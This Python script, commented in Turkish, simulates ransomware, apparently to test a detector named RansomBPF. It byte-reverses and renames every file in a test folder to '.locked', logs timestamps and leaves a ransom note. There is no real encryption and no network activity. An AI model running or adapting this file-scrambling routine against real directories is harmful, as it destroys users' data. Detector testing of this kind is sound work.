import os
import time
import random
import datetime  # [YENI] Zaman olcumu icin eklendi

# --- SALDIRGAN KONFİGÜRASYONU ---
TARGET_DIR = "/home/developer/test_files"
ENCRYPTED_EXTENSION = ".locked"
RANSOM_NOTE_NAME = "RESTORE_FILES.txt"
RANSOM_NOTE_CONTENT = """
DIKKAT!
Tum dosyalariniz RansomBPF Test Yazilimi tarafindan sifrelendi.
Sifreyi cozmek icin lutfen sistem yoneticinize basvurun.
"""

def simulate_encryption_activity():
    # 1. Hedef klasör kontrolü
    if not os.path.exists(TARGET_DIR):
        print(f"[HATA] Hedef klasör bulunamadı: {TARGET_DIR}")
        return

    # [YENI] Baslangic Zamani (Milisaniye Hassasiyetli)
    start_time = datetime.datetime.now()
    print(f"[*] Saldırı Başlatılıyor... TIMESTAMP: {start_time.strftime('%Y-%m-%d %H:%M:%S.%f')}")
    print(f"[*] Hedef: {TARGET_DIR}")

    files = [f for f in os.listdir(TARGET_DIR) if os.path.isfile(os.path.join(TARGET_DIR, f))]
    files = [f for f in files if not f.endswith(ENCRYPTED_EXTENSION) and f != "ransom_simulator.py"]

    print(f"[*] Toplam {len(files)} kurban dosya bulundu.")
    time.sleep(1)

    for i, filename in enumerate(files):
        full_path = os.path.join(TARGET_DIR, filename)

        try:
            # --- ADIM 1: DOSYAYI OKU VE ŞİFRELE ---
            with open(full_path, "rb+") as f:
                content = f.read()
                encrypted_content = content[::-1]
                f.seek(0)
                f.write(encrypted_content)
                f.truncate()

            # --- ADIM 2: UZANTIYI DEĞİŞTİR ---
            new_path = full_path + ENCRYPTED_EXTENSION
            os.rename(full_path, new_path)

            # [YENI] Islem Zamani Logu
            current_time = datetime.datetime.now().strftime('%H:%M:%S.%f')
            print(f"[+] Şifrelendi ({i+1}/{len(files)}) - {current_time}: {filename} -> {filename}{ENCRYPTED_EXTENSION}")

            # Hız Analizi (H1) testi için bekleme
            time.sleep(0.02)

        except Exception as e:
            print(f"[!] Hata oluştu {filename}: {e}")

    # --- ADIM 3: FİDYE NOTU BIRAK ---
    note_path = os.path.join(TARGET_DIR, RANSOM_NOTE_NAME)
    with open(note_path, "w") as f:
        f.write(RANSOM_NOTE_CONTENT)
    print(f"[*] Fidye notu bırakıldı: {note_path}")
    print("[*] SALDIRI TAMAMLANDI (Oldurulmedi).")

if __name__ == "__main__":
    simulate_encryption_activity()